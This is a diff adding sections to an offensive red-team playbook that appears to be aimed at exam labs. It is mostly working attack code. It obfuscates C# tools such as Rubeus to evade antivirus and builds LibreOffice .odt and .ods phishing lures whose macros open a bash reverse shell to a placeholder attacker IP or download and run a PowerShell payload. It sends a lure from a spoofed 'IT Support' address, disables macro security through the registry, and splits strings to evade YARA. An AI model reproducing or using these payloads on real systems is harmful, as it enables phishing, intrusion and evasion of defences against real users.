@@ -30,6 +30,7 @@ Cross-references:
 - [Phase 9d: Sleep Masking / Call-Stack Spoofing](#phase-9d-sleep-masking--call-stack-spoofing)
 - [Phase 9e: Modern Injection Variants](#phase-9e-modern-injection-variants)
 - [Phase 10: Defender-Specific Hunting Tools](#phase-10-defender-specific-hunting-tools)
+- [Phase 10b: InvisibilityCloak — C# Source-Level Obfuscation](#10b-invisibilitycloak--c-source-level-obfuscation)
 - [Phase 11: Office Macros & Document Lures](#phase-11-office-macros--document-lures)
 - [Phase 11b: AppLocker Publisher-Rule Bypass — Recovered CA Signing Key](#phase-11b-applocker-publisher-rule-bypass--recovered-ca-signing-key)
 - [LOTL Emphasis — In-Memory Everything](#lotl-emphasis--in-memory-everything)
@@ -878,6 +879,61 @@ DefenderCheck.exe payload.exe
 5. Validate against full vendor stack on isolated VM
 ```
 
+### 10b. InvisibilityCloak — C# Source-Level Obfuscation
+
+Pre-compilation string/symbol obfuscation for C# offensive tools (Rubeus, Seatbelt, SharpHound, Certify). Rewrites class names, method names, GUID attributes, and string literals before `csc` ever sees them — bypasses static signatures that key on known tool identifiers.
+
+```bash
+# Usage (run on attacker Linux/Windows with Python3 — no pip install needed, pure stdlib)
+# Repo already on Kali at /opt/InvisibilityCloak or cloned locally
+python3 InvisibilityCloak.py -d /path/to/SharpTool/ -m reverse
+python3 InvisibilityCloak.py -d /path/to/SharpTool/ -m base64
+python3 InvisibilityCloak.py -d /path/to/SharpTool/ -m rot13
+
+# Modes:
+#   reverse — reverses all identifiers and string literals (fastest, least entropy change)
+#   base64  — base64-encodes strings, inserts runtime decode stubs
+#   rot13   — ROT13 on identifiers + strings
+```
+
+```bash
+# Full pipeline: obfuscate Rubeus source → compile → donut → loader
+python3 InvisibilityCloak.py -d ./Rubeus/ -m base64
+cd Rubeus && dotnet build -c Release
+donut -i bin/Release/Rubeus.exe -o rubeus_cloak.bin
+# Load rubeus_cloak.bin via any Phase 4/6/7 loader
+```
+
+```bash
+# Combine with ThreatCheck iterative reduction
+python3 InvisibilityCloak.py -d ./Certify/ -m rot13
+cd Certify && csc /target:exe /out:Certify_obf.exe *.cs
+ThreatCheck.exe -f Certify_obf.exe
+# If still flagged: re-run with different mode or manually rename remaining signatured identifiers
+```
+
+#### Living-off-the-land / LOTL variant
+
+No native OS equivalent exists for automated C# source obfuscation. Manual LOTL approach using only `sed`/`find` (Linux) or PowerShell string replacement (Windows):
+
+```bash
+# Linux — bulk rename a known-signatured class name across all .cs files
+find ./Rubeus/Rubeus/ -name "*.cs" -exec sed -i 's/Roast/R04st/g' {} +
+find ./Rubeus/Rubeus/ -name "*.cs" -exec sed -i 's/Kerberos/K3rb3r0s/g' {} +
+find ./Rubeus/Rubeus/ -name "*.cs" -exec sed -i 's/Rubeus/Rub3us/g' {} +
+# Also rename the .csproj AssemblyName and namespace references
+sed -i 's/<AssemblyName>Rubeus</<AssemblyName>Rub3us</g' ./Rubeus/Rubeus/Rubeus.csproj
+```
+
+```powershell
+# Windows — same via PowerShell (no external tools)
+Get-ChildItem -Path .\Rubeus\ -Filter *.cs -Recurse | ForEach-Object {
+    (Get-Content $_.FullName) -replace 'Rubeus','Rub3us' -replace 'Roast','R04st' | Set-Content $_.FullName
+}
+# Rename assembly metadata in .csproj
+(Get-Content .\Rubeus\Rubeus.csproj) -replace 'Rubeus','Rub3us' | Set-Content .\Rubeus\Rubeus.csproj
+```
+
 ---
 
 ## Phase 11: Office Macros & Document Lures
@@ -982,6 +1038,218 @@ rlwrap nc -lnvp <ATTACKER_PORT>
 > **OPSEC:** StarBasic `Shell()` ≡ VBA `Shell()` — `cmd.exe`/`powershell.exe` parented to `soffice.bin` is a high-fidelity IOC. Drop the `GetOS` branch if Windows-only (less detonation noise on Linux sandboxes). LO/OO 4.4+ raises a security warning for internet-zone macros — lure-craft accordingly.
 
 > **LOTL caveat:** Native binary — preinstalled on most Linux desktops and shipped in some hardened Windows kiosks. Useful when MS Office is blocked but ODF readers aren't.
+
+### 11a-b. Linux Bash Reverse Shell via LibreOffice StarBasic
+
+When the target is a Linux box with LibreOffice, use `Shell("/bin/bash ...")` instead of `cmd.exe`. Delivers a reverse shell parented to `soffice.bin` without touching PowerShell or Windows APIs.
+
+```bash
+# Build .odt with Linux bash reverse shell — headless XML-level approach (no GUI needed)
+mkdir -p odt_linux/{META-INF,Basic/Standard}
+
+cat > odt_linux/mimetype <<'EOF'
+application/vnd.oasis.opendocument.text
+EOF
+
+cat > odt_linux/META-INF/manifest.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
+  <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>
+  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
+  <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
+  <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
+</manifest:manifest>
+EOF
+
+cat > odt_linux/content.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
+  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2">
+  <office:body><office:text><text:p>Please enable macros to view this document.</text:p></office:text></office:body>
+</office:document-content>
+EOF
+
+cat > odt_linux/Basic/script-lc.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <library:library library:name="Standard" library:link="false"/>
+</library:libraries>
+EOF
+
+cat > odt_linux/Basic/Standard/Module1.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****
+
+Sub OnLoad
+    Shell("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'")
+End Sub
+</script:module>
+EOF
+
+# Package as .odt (mimetype must be first entry, stored uncompressed)
+cd odt_linux && zip -0 -X ../phish_linux.odt mimetype && zip -rq ../phish_linux.odt . -x mimetype && cd ..
+```
+
+```bash
+# Delivery via swaks (SMTP on attacker box — common in exam labs with mail relay)
+swaks --to <TARGET_EMAIL> --from "IT Support <support@<DOMAIN>>" \
+  --header "Subject: Q3 Report" --body "Please review attached." \
+  --attach phish_linux.odt --server <SMTP_SERVER>
+```
+
+```bash
+# Catch reverse shell
+rlwrap nc -lnvp <ATTACKER_PORT>
+```
+
+#### Living-off-the-land / LOTL variant
+
+The macro itself IS the LOTL vector (LibreOffice is the pre-installed binary). For building the .odt without any external tools beyond `zip` (present on all Linux/macOS):
+
+```bash
+# Pure shell — write Module1.xml inline, no python/pip/msf needed
+# (same commands as above — mkdir + cat + zip are all coreutils/busybox)
+```
+
+### 11a-c. MacroSecurityLevel Registry Bypass (Pre-Stage for Macro Execution)
+
+If you already have code execution on a Windows target (e.g., RCE via web app, WinRM, or lateral movement) and need to ensure a follow-on LibreOffice macro payload executes without the security prompt, lower the `MacroSecurityLevel` via registry before delivering the .odt lure.
+
+```cmd
+REM Lower LibreOffice macro security to 0 (run all macros without prompt) — per-machine policy
+reg add "HKLM\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v "Value" /t REG_DWORD /d 0 /f
+
+REM Per-user variant (no admin required)
+reg add "HKCU\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v "Value" /t REG_DWORD /d 0 /f
+```
+
+```powershell
+# PowerShell equivalent
+New-Item -Path "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Name "Value" -Value 0 -Type DWord
+
+# HKCU variant (no elevation needed)
+New-Item -Path "HKCU:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Force
+Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Name "Value" -Value 0 -Type DWord
+```
+
+```cmd
+REM Verify the change took effect
+reg query "HKLM\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v Value
+REM Expected output: Value    REG_DWORD    0x0
+```
+
+#### Living-off-the-land / LOTL variant
+
+`reg.exe` and PowerShell `Set-ItemProperty` are both built-in Windows binaries — no external tools needed. This IS the LOTL method. Alternative via `wmic` (legacy, pre-Win11):
+
+```cmd
+REM wmic alternative for older hosts (deprecated but functional)
+wmic /namespace:\\root\default path SystemRestore call Disable
+REM (wmic cannot write arbitrary registry — reg.exe is the true native path here)
+```
+
+### 11a-d. ODS Event Handler Binding + Variable-Splitting YARA Evasion
+
+For `.ods` (spreadsheet) payloads: bind the macro to the "Open Document" event via `META-INF/manifest.xml` event registration, and split command strings across multiple Basic variables to evade YARA rules that match on contiguous `/bin/bash` or `powershell` strings.
+
+```bash
+# Build .ods with event-bound macro + variable-splitting evasion
+mkdir -p ods_payload/{META-INF,Basic/Standard}
+
+cat > ods_payload/mimetype <<'EOF'
+application/vnd.oasis.opendocument.spreadsheet
+EOF
+
+cat > ods_payload/META-INF/manifest.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
+  <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.spreadsheet"/>
+  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
+  <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
+  <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
+</manifest:manifest>
+EOF
+
+# Event binding: register macro to fire on document open
+cat > ods_payload/content.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
+  xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"
+  xmlns:dom="http://www.w3.org/2001/xml-events"
+  xmlns:xlink="http://www.w3.org/1999/xlink"
+  xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" office:version="1.2">
+  <office:scripts>
+    <office:event-listeners>
+      <script:event-listener script:language="ooo:Basic" script:event-name="dom:load"
+        xlink:href="vnd.sun.star.script:Standard.Module1.OnLoad?language=Basic&amp;location=document" xlink:type="simple"/>
+    </office:event-listeners>
+  </office:scripts>
+  <office:body><office:spreadsheet><table:table table:name="Sheet1"/></office:spreadsheet></office:body>
+</office:document-content>
+EOF
+
+cat > ods_payload/Basic/script-lc.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <library:library library:name="Standard" library:link="false"/>
+</library:libraries>
+EOF
+
+# Variable-splitting evasion: no single string contains full command
+cat > ods_payload/Basic/Standard/Module1.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****
+
+Sub OnLoad
+    Dim a As String
+    Dim b As String
+    Dim c As String
+    Dim d As String
+    a = "/bin/ba"
+    b = "sh -c '"
+    c = "bash -i >& /dev/tc"
+    d = "p/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'"
+    Shell(a &amp; b &amp; c &amp; d)
+End Sub
+</script:module>
+EOF
+
+cd ods_payload && zip -0 -X ../phish.ods mimetype && zip -rq ../phish.ods . -x mimetype && cd ..
+```
+
+```bash
+# Windows variant with variable-split powershell (same ODS structure, different Module1.xml payload)
+cat > ods_payload/Basic/Standard/Module1.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****
+
+Sub OnLoad
+    Dim a As String
+    Dim b As String
+    Dim c As String
+    a = "cm" &amp; "d.e" &amp; "xe"
+    b = " /C power" &amp; "shell.exe -no" &amp; "p -w hid"
+    c = "den -c IEX(IWR http://<ATTACKER_IP>:<ATTACKER_PORT>/p.ps1 -UseB" &amp; "asicParsing)"
+    Shell(a &amp; b &amp; c)
+End Sub
+</script:module>
+EOF
+
+cd ods_payload && zip -0 -X ../phish_win.ods mimetype && zip -rq ../phish_win.ods . -x mimetype && cd ..
+```
+
+> **UI binding method (alternative to XML):** Open the .ods in LibreOffice GUI > Tools > Customize > Events tab > "Open Document" event > Assign Macro > select Standard.Module1.OnLoad > OK > Save. This writes the same `office:event-listeners` XML block shown above. The headless XML approach above is preferred for exam speed.
+
+#### Living-off-the-land / LOTL variant
+
+Building the .ods requires only `mkdir`, `cat`, and `zip` — all present in base Linux/macOS installs. No Python, no Metasploit, no pip packages needed. The variable-splitting technique is pure StarBasic string concatenation evaluated at runtime — no external tooling.
+
+```bash
+# Verify YARA evasion: the assembled .ods zip should NOT contain "/bin/bash" as a contiguous string
+strings phish.ods | grep -i "/bin/bash"   # should return nothing
+strings phish.ods | grep -i "powershell"  # should return nothing (Windows variant)
+```
 
 [↑ top](#table-of-contents)
 
